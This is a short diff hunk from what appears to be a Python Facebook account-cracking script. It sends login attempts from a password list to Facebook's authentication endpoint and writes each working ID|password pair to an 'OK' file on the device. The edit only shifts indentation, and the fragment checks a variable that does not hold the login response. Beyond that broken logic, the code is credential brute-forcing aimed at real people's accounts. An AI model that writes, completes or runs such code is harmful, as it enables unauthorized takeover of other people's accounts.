@@ -519,7 +519,7 @@ def api(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
-				if 'session_key' in q:
+			if 'session_key' in q:
 					print('\r\r\033[1;32m [JALIIIL-OK] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/JALIIIL/JALIIIL-OK.txt','a').write(ids+'|'+pas+'\n')
 					oks.append(ids)
